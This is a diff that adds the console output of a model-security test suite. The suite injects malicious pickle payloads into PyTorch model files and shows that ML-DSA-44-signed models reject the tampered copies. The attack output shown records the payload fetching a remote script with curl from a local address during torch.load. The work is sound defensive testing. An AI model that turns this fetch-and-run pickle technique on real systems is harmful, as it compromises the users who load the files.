@@ -1,0 +1,876 @@
+======================================================================
+[SECURITY] COMPREHENSIVE MODEL SECURITY TEST SUITE
+======================================================================
+
+Testing 3 model sizes: Small, Medium, Large
+Each model will go through:
+  1. Create normal & signed models
+  2. Inject malicious code into both
+  3. Test 4 scenarios:
+     - Normal model (torch.load)
+     - Normal+Malicious (torch.load) - ATTACK
+     - Signed model (SecureSignedModel)
+     - Signed+Malicious (SecureSignedModel) - BLOCKED
+======================================================================
+
+
+======================================================================
+[TARGET] TESTING SMALL MODEL
+======================================================================
+======================================================================
+[PREPARE] STEP 1: Preparing Models for SMALL
+======================================================================
+
+   Source model: models/small_model.pt
+   Source size: 87.178506 MB (91,413,289 bytes)
+
+   Loading source model...
+   ✓ Model loaded in 1229.92 ms
+
+   [1/2] Saving normal model (without signature, using torch.save)...
+   ✓ Normal model saved: models_defense/small_normal.pt
+   ✓ Size: 87.178917 MB (91,413,720 bytes)
+   ✓ Save time: 64.01 ms
+
+   [2/2] Creating self-verifying model with ML-DSA-44...
+======================================================================
+ CREATING SELF-VERIFYING MODEL
+======================================================================
+
+[Step 1/6] Loading original model: models_defense/small_normal.pt
+   ✓ Model loaded
+   Type: SentenceTransformer
+   Size: 87.18 MB
+   Load time: 0.044s
+
+[Step 2/6] Serializing model data...
+   ✓ Serialized: 91,394,763 bytes
+   Serialize time: 0.059s
+
+[Step 3/6] Computing SHA-256 hash...
+   ✓ Hash computed: d6c7ed41fa13458e7fa3a7710e05b1b1...
+   Hash time: 0.031607s
+
+[Step 4/6] Loading cryptographic keys...
+   ✓ Secret key: 2560 bytes
+   ✓ Public key: 1312 bytes
+
+[Step 5/6] Signing with ML-DSA-44...
+   ✓ Signature generated: 2420 bytes
+   Sign time: 0.000s
+
+[Step 6/6] Creating self-verifying model...
+   ✓ Self-verifying wrapper created
+      Model data bytes: 91,394,763 bytes (embedded)
+      Public key: 1312 bytes (embedded)
+      Signature: 2420 bytes (embedded)
+
+[Step 7/6] Saving self-verifying model...
+   ✓ Saved to: models_defense/small_signed.pt
+   Output size: 87.17 MB
+   Overhead: -13.51 KB (-0.0151%)
+   Save time: 0.112s
+
+======================================================================
+[SUCCESS] SELF-VERIFYING MODEL CREATED SUCCESSFULLY
+======================================================================
+Original: models_defense/small_normal.pt
+Output: models_defense/small_signed.pt
+Total time: 0.246s
+
+Security features:
+  ✓ Embedded public key
+  ✓ Embedded signature
+  ✓ Automatic verification on load
+======================================================================
+
+SMALL models prepared!
+   Normal: models_defense/small_normal.pt
+      Size: 87.178917 MB (91,413,720 bytes)
+   Signed: models_defense/small_signed.pt
+      Size: 87.165721 MB (91,399,883 bytes)
+      Signature overhead: -13.512695 KB (-13,837 bytes)
+      Signing time: 248.73 ms
+
+======================================================================
+[INJECT] STEP 2: Injecting Malicious Code into SMALL Models
+======================================================================
+
+   [1/2] Creating NORMAL+MALICIOUS model...
+   ✓ Saved: models_attack/small_normal_malicious.pt
+      Size: 87.180220 MB (91,415,086 bytes)
+      Payload overhead: 1.333984 KB (1,366 bytes)
+   [TIME] Injection time: 60.73 ms
+
+   [2/2] Creating SIGNED+MALICIOUS model...
+     Injecting malicious payload into signed model...
+   [INFO] Loading signed model (returns SelfVerifier object)...
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 91,394,763 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: d6c7ed41fa13458e7fa3a7710e05b1b1...
+   Hash time: 31.61 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.14 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [INFO] Extracting model_data_bytes from SelfVerifier...
+   [INFO] Injecting MaliciousPayload() object...
+   [INFO] Serializing modified model back to model_data_bytes...
+   ✓ Payload injected (signature/public_key preserved, will fail verification)
+   ✓ Saved: models_attack/small_signed_malicious.pt
+      Size: 87.165961 MB (91,400,135 bytes)
+      Tamper overhead: 0.246094 KB (252 bytes)
+      Tampering time: 105.14 ms
+
+ Malicious models created!
+   Normal+Malicious: models_attack/small_normal_malicious.pt
+      Size: 87.180220 MB (91,415,086 bytes)
+   Signed+Malicious: models_attack/small_signed_malicious.pt
+      Size: 87.165961 MB (91,400,135 bytes)
+
+======================================================================
+[TEST] STEP 3: Loading Tests for SMALL Model
+======================================================================
+
+[Test 1/4] Loading NORMAL model with torch.load (should succeed)...
+
+   Testing normal model...
+   File: models_defense/small_normal.pt
+   Expected: SUCCESS
+
+   Loading with torch.load()...
+   [PASS] Normal model loaded successfully
+   [TIME] Load time: 32.40 ms
+   Model type: <class 'sentence_transformers.SentenceTransformer.SentenceTransformer'>
+
+[Test 2/4] Loading NORMAL+MALICIOUS model with torch.load [ATTACK]...
+
+   Testing malicious model...
+   File: models_attack/small_normal_malicious.pt
+   Expected: ATTACK_DEMO
+
+   [WARNING] Loading with torch.load() (VULNERABLE!)
+   [WARNING] Malicious code WILL execute during unpickling...
+   ──────────────────────────────────────────────────────────────────
+==========================================
+Your device is hacked
+==========================================
+
+Attack timestamp: Thu Dec 25 09:02:09 PM KST 2025
+Current user: sunwoo
+Working directory: /home/sunwoo/SelfVerifier/about-pickle_internal
+
+This demonstrates a successful exploitation
+of PyTorch pickle deserialization vulnerability!
+==========================================
+   ──────────────────────────────────────────────────────────────────
+   [DANGER] ATTACK EXECUTED!
+   [DANGER] Malicious payload was triggered during unpickling
+   [DANGER] Remote script downloaded: curl http://192.168.0.100:8888/attack_demo.sh
+   [TIME] Attack execution time: 39.51 ms
+
+   [WARNING] DEMONSTRATION: Attack succeeded (torch.load is vulnerable)
+
+[Test 3/4] Loading SIGNED model with SecureSignedModel (should succeed)...
+
+   Testing signed model...
+   File: models_defense/small_signed.pt
+   Expected: SUCCESS
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 91,394,763 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: d6c7ed41fa13458e7fa3a7710e05b1b1...
+   Hash time: 31.99 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.14 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [PASS] Model loaded successfully (signature auto-verified)
+   [TIME] Auto-verification + Load time: 107.59 ms
+   Model type: <class 'self_verifying_secure.SelfVerifier'>
+
+[Test 4/4] Attempting SIGNED+MALICIOUS with SecureSignedModel [BLOCKED]...
+
+   Testing signed model...
+   File: models_attack/small_signed_malicious.pt
+   Expected: FAIL
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 91,394,891 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: ba6cf48a138a35b6bd0d6ad434d8d0cc...
+   Hash time: 31.64 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.10 ms
+   [FAIL] Signature verification failed!
+
+======================================================================
+[FAIL] SIGNATURE VERIFICATION FAILED!
+======================================================================
+This model may have been:
+  • Signed with a different key
+  • Corrupted during transfer
+  • Tampered with maliciously
+
+[WARNING] DO NOT USE THIS MODEL!
+======================================================================
+   [BLOCK] Model rejected by security mechanism
+   [BLOCK] Error: Signature verification FAILED! This model may be from an untrusted source. DO NOT use this model!...
+   [TIME] Detection time: 102.37 ms
+
+
+======================================================================
+[TARGET] TESTING MEDIUM MODEL
+======================================================================
+======================================================================
+[PREPARE] STEP 1: Preparing Models for MEDIUM
+======================================================================
+
+   Source model: models/medium_model.pt
+   Source size: 2511.407998 MB (2,633,402,153 bytes)
+
+   Loading source model...
+   ✓ Model loaded in 741.57 ms
+
+   [1/2] Saving normal model (without signature, using torch.save)...
+   ✓ Normal model saved: models_defense/medium_normal.pt
+   ✓ Size: 2511.408496 MB (2,633,402,675 bytes)
+   ✓ Save time: 1608.41 ms
+
+   [2/2] Creating self-verifying model with ML-DSA-44...
+======================================================================
+ CREATING SELF-VERIFYING MODEL
+======================================================================
+
+[Step 1/6] Loading original model: models_defense/medium_normal.pt
+   ✓ Model loaded
+   Type: dict
+   Size: 2511.41 MB
+   Load time: 0.740s
+
+[Step 2/6] Serializing model data...
+   ✓ Serialized: 2,633,233,938 bytes
+   Serialize time: 1.373s
+
+[Step 3/6] Computing SHA-256 hash...
+   ✓ Hash computed: baf19eb16258b5797ca76f638bfc3046...
+   Hash time: 0.904031s
+
+[Step 4/6] Loading cryptographic keys...
+   ✓ Secret key: 2560 bytes
+   ✓ Public key: 1312 bytes
+
+[Step 5/6] Signing with ML-DSA-44...
+   ✓ Signature generated: 2420 bytes
+   Sign time: 0.001s
+
+[Step 6/6] Creating self-verifying model...
+   ✓ Self-verifying wrapper created
+      Model data bytes: 2,633,233,938 bytes (embedded)
+      Public key: 1312 bytes (embedded)
+      Signature: 2420 bytes (embedded)
+
+[Step 7/6] Saving self-verifying model...
+   ✓ Saved to: models_defense/medium_signed.pt
+   Output size: 2511.25 MB
+   Overhead: -159.78 KB (-0.0062%)
+   Save time: 3.061s
+
+======================================================================
+[SUCCESS] SELF-VERIFYING MODEL CREATED SUCCESSFULLY
+======================================================================
+Original: models_defense/medium_normal.pt
+Output: models_defense/medium_signed.pt
+Total time: 6.079s
+
+Security features:
+  ✓ Embedded public key
+  ✓ Embedded signature
+  ✓ Automatic verification on load
+======================================================================
+
+MEDIUM models prepared!
+   Normal: models_defense/medium_normal.pt
+      Size: 2511.408496 MB (2,633,402,675 bytes)
+   Signed: models_defense/medium_signed.pt
+      Size: 2511.252458 MB (2,633,239,057 bytes)
+      Signature overhead: -159.783203 KB (-163,618 bytes)
+      Signing time: 6202.14 ms
+
+======================================================================
+[INJECT] STEP 2: Injecting Malicious Code into MEDIUM Models
+======================================================================
+
+   [1/2] Creating NORMAL+MALICIOUS model...
+   ✓ Saved: models_attack/medium_normal_malicious.pt
+      Size: 2511.412436 MB (2,633,406,807 bytes)
+      Payload overhead: 4.035156 KB (4,132 bytes)
+   [TIME] Injection time: 1591.82 ms
+
+   [2/2] Creating SIGNED+MALICIOUS model...
+     Injecting malicious payload into signed model...
+   [INFO] Loading signed model (returns SelfVerifier object)...
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 2,633,233,938 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: baf19eb16258b5797ca76f638bfc3046...
+   Hash time: 903.75 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.17 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [INFO] Extracting model_data_bytes from SelfVerifier...
+   [INFO] Injecting MaliciousPayload() object...
+   [INFO] Serializing modified model back to model_data_bytes...
+   ✓ Payload injected (signature/public_key preserved, will fail verification)
+   ✓ Saved: models_attack/medium_signed_malicious.pt
+      Size: 2511.252698 MB (2,633,239,309 bytes)
+      Tamper overhead: 0.246094 KB (252 bytes)
+      Tampering time: 3083.77 ms
+
+ Malicious models created!
+   Normal+Malicious: models_attack/medium_normal_malicious.pt
+      Size: 2511.412436 MB (2,633,406,807 bytes)
+   Signed+Malicious: models_attack/medium_signed_malicious.pt
+      Size: 2511.252698 MB (2,633,239,309 bytes)
+
+======================================================================
+[TEST] STEP 3: Loading Tests for MEDIUM Model
+======================================================================
+
+[Test 1/4] Loading NORMAL model with torch.load (should succeed)...
+
+   Testing normal model...
+   File: models_defense/medium_normal.pt
+   Expected: SUCCESS
+
+   Loading with torch.load()...
+   [PASS] Normal model loaded successfully
+   [TIME] Load time: 407.77 ms
+   Model type: <class 'dict'>
+
+[Test 2/4] Loading NORMAL+MALICIOUS model with torch.load [ATTACK]...
+
+   Testing malicious model...
+   File: models_attack/medium_normal_malicious.pt
+   Expected: ATTACK_DEMO
+
+   [WARNING] Loading with torch.load() (VULNERABLE!)
+   [WARNING] Malicious code WILL execute during unpickling...
+   ──────────────────────────────────────────────────────────────────
+==========================================
+Your device is hacked
+==========================================
+
+Attack timestamp: Thu Dec 25 09:02:30 PM KST 2025
+Current user: sunwoo
+Working directory: /home/sunwoo/SelfVerifier/about-pickle_internal
+
+This demonstrates a successful exploitation
+of PyTorch pickle deserialization vulnerability!
+==========================================
+   ──────────────────────────────────────────────────────────────────
+   [DANGER] ATTACK EXECUTED!
+   [DANGER] Malicious payload was triggered during unpickling
+   [DANGER] Remote script downloaded: curl http://192.168.0.100:8888/attack_demo.sh
+   [TIME] Attack execution time: 408.70 ms
+
+   [WARNING] DEMONSTRATION: Attack succeeded (torch.load is vulnerable)
+
+[Test 3/4] Loading SIGNED model with SecureSignedModel (should succeed)...
+
+   Testing signed model...
+   File: models_defense/medium_signed.pt
+   Expected: SUCCESS
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 2,633,233,938 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: baf19eb16258b5797ca76f638bfc3046...
+   Hash time: 904.70 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.17 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [PASS] Model loaded successfully (signature auto-verified)
+   [TIME] Auto-verification + Load time: 2840.84 ms
+   Model type: <class 'self_verifying_secure.SelfVerifier'>
+
+[Test 4/4] Attempting SIGNED+MALICIOUS with SecureSignedModel [BLOCKED]...
+
+   Testing signed model...
+   File: models_attack/medium_signed_malicious.pt
+   Expected: FAIL
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 2,633,234,041 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: 3fbe02aa0cd1380d8e595c42a792b45e...
+   Hash time: 902.27 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.10 ms
+   [FAIL] Signature verification failed!
+
+======================================================================
+[FAIL] SIGNATURE VERIFICATION FAILED!
+======================================================================
+This model may have been:
+  • Signed with a different key
+  • Corrupted during transfer
+  • Tampered with maliciously
+
+[WARNING] DO NOT USE THIS MODEL!
+======================================================================
+   [BLOCK] Model rejected by security mechanism
+   [BLOCK] Error: Signature verification FAILED! This model may be from an untrusted source. DO NOT use this model!...
+   [TIME] Detection time: 2783.81 ms
+
+
+======================================================================
+[TARGET] TESTING LARGE MODEL
+======================================================================
+======================================================================
+[PREPARE] STEP 1: Preparing Models for LARGE
+======================================================================
+
+   Source model: models/large_model.pt
+   Source size: 12701.888911 MB (13,318,895,867 bytes)
+
+   Loading source model...
+   ✓ Model loaded in 3098.22 ms
+
+   [1/2] Saving normal model (without signature, using torch.save)...
+   ✓ Normal model saved: models_defense/large_normal.pt
+   ✓ Size: 12701.889531 MB (13,318,896,517 bytes)
+   ✓ Save time: 8084.02 ms
+
+   [2/2] Creating self-verifying model with ML-DSA-44...
+======================================================================
+ CREATING SELF-VERIFYING MODEL
+======================================================================
+
+[Step 1/6] Loading original model: models_defense/large_normal.pt
+   ✓ Model loaded
+   Type: dict
+   Size: 12701.89 MB
+   Load time: 3.475s
+
+[Step 2/6] Serializing model data...
+   ✓ Serialized: 13,318,716,648 bytes
+   Serialize time: 6.674s
+
+[Step 3/6] Computing SHA-256 hash...
+   ✓ Hash computed: 8c31b701fb5c7861f1197a36e4829c62...
+   Hash time: 4.609934s
+
+[Step 4/6] Loading cryptographic keys...
+   ✓ Secret key: 2560 bytes
+   ✓ Public key: 1312 bytes
+
+[Step 5/6] Signing with ML-DSA-44...
+   ✓ Signature generated: 2420 bytes
+   Sign time: 0.000s
+
+[Step 6/6] Creating self-verifying model...
+   ✓ Self-verifying wrapper created
+      Model data bytes: 13,318,716,648 bytes (embedded)
+      Public key: 1312 bytes (embedded)
+      Signature: 2420 bytes (embedded)
+
+[Step 7/6] Saving self-verifying model...
+   ✓ Saved to: models_defense/large_signed.pt
+   Output size: 12701.72 MB
+   Overhead: -170.53 KB (-0.0013%)
+   Save time: 14.674s
+
+======================================================================
+[SUCCESS] SELF-VERIFYING MODEL CREATED SUCCESSFULLY
+======================================================================
+Original: models_defense/large_normal.pt
+Output: models_defense/large_signed.pt
+Total time: 29.433s
+
+Security features:
+  ✓ Embedded public key
+  ✓ Embedded signature
+  ✓ Automatic verification on load
+======================================================================
+
+LARGE models prepared!
+   Normal: models_defense/large_normal.pt
+      Size: 12701.889531 MB (13,318,896,517 bytes)
+   Signed: models_defense/large_signed.pt
+      Size: 12701.722995 MB (13,318,721,891 bytes)
+      Signature overhead: -170.533203 KB (-174,626 bytes)
+      Signing time: 29874.28 ms
+
+======================================================================
+[INJECT] STEP 2: Injecting Malicious Code into LARGE Models
+======================================================================
+
+   [1/2] Creating NORMAL+MALICIOUS model...
+   ✓ Saved: models_attack/large_normal_malicious.pt
+      Size: 12701.894692 MB (13,318,901,929 bytes)
+      Payload overhead: 5.285156 KB (5,412 bytes)
+   [TIME] Injection time: 8244.88 ms
+
+   [2/2] Creating SIGNED+MALICIOUS model...
+     Injecting malicious payload into signed model...
+   [INFO] Loading signed model (returns SelfVerifier object)...
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 13,318,716,648 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: 8c31b701fb5c7861f1197a36e4829c62...
+   Hash time: 4631.11 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.14 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [INFO] Extracting model_data_bytes from SelfVerifier...
+   [INFO] Injecting MaliciousPayload() object...
+   [INFO] Serializing modified model back to model_data_bytes...
+   ✓ Payload injected (signature/public_key preserved, will fail verification)
+   ✓ Saved: models_attack/large_signed_malicious.pt
+      Size: 12701.723174 MB (13,318,722,079 bytes)
+      Tamper overhead: 0.183594 KB (188 bytes)
+      Tampering time: 14320.49 ms
+
+ Malicious models created!
+   Normal+Malicious: models_attack/large_normal_malicious.pt
+      Size: 12701.894692 MB (13,318,901,929 bytes)
+   Signed+Malicious: models_attack/large_signed_malicious.pt
+      Size: 12701.723174 MB (13,318,722,079 bytes)
+
+======================================================================
+[TEST] STEP 3: Loading Tests for LARGE Model
+======================================================================
+
+[Test 1/4] Loading NORMAL model with torch.load (should succeed)...
+
+   Testing normal model...
+   File: models_defense/large_normal.pt
+   Expected: SUCCESS
+
+   Loading with torch.load()...
+   [PASS] Normal model loaded successfully
+   [TIME] Load time: 3470.18 ms
+   Model type: <class 'dict'>
+
+[Test 2/4] Loading NORMAL+MALICIOUS model with torch.load [ATTACK]...
+
+   Testing malicious model...
+   File: models_attack/large_normal_malicious.pt
+   Expected: ATTACK_DEMO
+
+   [WARNING] Loading with torch.load() (VULNERABLE!)
+   [WARNING] Malicious code WILL execute during unpickling...
+   ──────────────────────────────────────────────────────────────────
+==========================================
+Your device is hacked
+==========================================
+
+Attack timestamp: Thu Dec 25 09:04:23 PM KST 2025
+Current user: sunwoo
+Working directory: /home/sunwoo/SelfVerifier/about-pickle_internal
+
+This demonstrates a successful exploitation
+of PyTorch pickle deserialization vulnerability!
+==========================================
+   ──────────────────────────────────────────────────────────────────
+   [DANGER] ATTACK EXECUTED!
+   [DANGER] Malicious payload was triggered during unpickling
+   [DANGER] Remote script downloaded: curl http://192.168.0.100:8888/attack_demo.sh
+   [TIME] Attack execution time: 3797.58 ms
+
+   [WARNING] DEMONSTRATION: Attack succeeded (torch.load is vulnerable)
+
+[Test 3/4] Loading SIGNED model with SecureSignedModel (should succeed)...
+
+   Testing signed model...
+   File: models_defense/large_signed.pt
+   Expected: SUCCESS
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 13,318,716,648 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: 8c31b701fb5c7861f1197a36e4829c62...
+   Hash time: 4568.78 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.16 ms
+   [VALID] Signature VALID!
+
+======================================================================
+[VALID] VERIFICATION COMPLETE - MODEL IS AUTHENTIC
+======================================================================
+All security checks passed:
+  ✓ Cryptographic signature valid
+  ✓ Model is from trusted source
+  ✓ Model has not been tampered
+  ✓ Safe to use
+======================================================================
+
+[Step 4/3] Returning verified SelfVerifier object...
+   ✓ Signature and public key preserved in returned object
+   ✓ This ensures re-saved models will still be verified
+   [PASS] Model loaded successfully (signature auto-verified)
+   [TIME] Auto-verification + Load time: 14442.25 ms
+   Model type: <class 'self_verifying_secure.SelfVerifier'>
+
+[Test 4/4] Attempting SIGNED+MALICIOUS with SecureSignedModel [BLOCKED]...
+
+   Testing signed model...
+   File: models_attack/large_signed_malicious.pt
+   Expected: FAIL
+
+   Loading with torch.load() - AUTOMATIC VERIFICATION
+   [INFO] __reduce__() hook will auto-verify signature
+
+======================================================================
+[SECURE] SELF-VERIFYING MODEL - AUTO VERIFICATION
+======================================================================
+
+[Step 1/3] Checking serialized model data...
+   Model data size: 13,318,716,753 bytes
+
+[Step 2/3] Computing SHA-256 hash...
+   Computed hash: da13eb84c429b711c2c80a1ee6698b61...
+   Hash time: 4569.60 ms
+
+[Step 3/3] Verifying ML-DSA-44 signature...
+   Signature size: 2420 bytes
+   Public key size: 1312 bytes
+   Verify time: 0.12 ms
+   [FAIL] Signature verification failed!
+
+======================================================================
+[FAIL] SIGNATURE VERIFICATION FAILED!
+======================================================================
+This model may have been:
+  • Signed with a different key
+  • Corrupted during transfer
+  • Tampered with maliciously
+
+[WARNING] DO NOT USE THIS MODEL!
+======================================================================
+   [BLOCK] Model rejected by security mechanism
+   [BLOCK] Error: Signature verification FAILED! This model may be from an untrusted source. DO NOT use this model!...
+   [TIME] Detection time: 14177.17 ms
+
+
+======================================================================
+[SUMMARY] FINAL TEST SUMMARY
+======================================================================
+
+SMALL Model:
+  [PASS]: Normal model - torch.load
+  [DANGER]: Normal+Malicious - torch.load (attack)
+  [PASS]: Signed model - SecureSignedModel
+  [BLOCK]: Signed+Malicious - SecureSignedModel (blocked)
+
+MEDIUM Model:
+  [PASS]: Normal model - torch.load
+  [DANGER]: Normal+Malicious - torch.load (attack)
+  [PASS]: Signed model - SecureSignedModel
+  [BLOCK]: Signed+Malicious - SecureSignedModel (blocked)
+
+LARGE Model:
+  [PASS]: Normal model - torch.load
+  [DANGER]: Normal+Malicious - torch.load (attack)
+  [PASS]: Signed model - SecureSignedModel
+  [BLOCK]: Signed+Malicious - SecureSignedModel (blocked)
+
+======================================================================
+Total: 12/12 tests passed (100%)
+======================================================================
+
+[SUCCESS] ALL TESTS COMPLETED SUCCESSFULLY!
+
+[SECURITY] Security Results:
+  [BLOCK] Secure loading (blocked): 3/3
+  [DANGER] Attack demonstrations: 3/3
+
+[WARNING] Key Finding: torch.load() is VULNERABLE to pickle attacks!
+[SUCCESS] SecureSignedModel successfully blocks all malicious models!
+
+
+======================================================================
+[INFO] FILE SIZE SUMMARY
+======================================================================
+
+SMALL Model:
+  1. Normal model:             87.178917 MB  (     91,413,720 bytes)
+  2. Normal + Malicious:       87.180220 MB  (     91,415,086 bytes)
+     Payload overhead:          1.333984 KB  (          1,366 bytes)
+  3. Signed model:             87.165721 MB  (     91,399,883 bytes)
+     Signature overhead:      -13.512695 KB  (        -13,837 bytes)
+  4. Signed + Tampered:        87.165961 MB  (     91,400,135 bytes)
+     Tamper overhead:           0.246094 KB  (            252 bytes)
+
+MEDIUM Model:
+  1. Normal model:           2511.408496 MB  (  2,633,402,675 bytes)
+  2. Normal + Malicious:     2511.412436 MB  (  2,633,406,807 bytes)
+     Payload overhead:          4.035156 KB  (          4,132 bytes)
+  3. Signed model:           2511.252458 MB  (  2,633,239,057 bytes)
+     Signature overhead:     -159.783203 KB  (       -163,618 bytes)
+  4. Signed + Tampered:      2511.252698 MB  (  2,633,239,309 bytes)
+     Tamper overhead:           0.246094 KB  (            252 bytes)
+
+LARGE Model:
+  1. Normal model:          12701.889531 MB  ( 13,318,896,517 bytes)
+  2. Normal + Malicious:    12701.894692 MB  ( 13,318,901,929 bytes)
+     Payload overhead:          5.285156 KB  (          5,412 bytes)
+  3. Signed model:          12701.722995 MB  ( 13,318,721,891 bytes)
+     Signature overhead:     -170.533203 KB  (       -174,626 bytes)
+  4. Signed + Tampered:     12701.723174 MB  ( 13,318,722,079 bytes)
+     Tamper overhead:           0.183594 KB  (            188 bytes)
+
+======================================================================
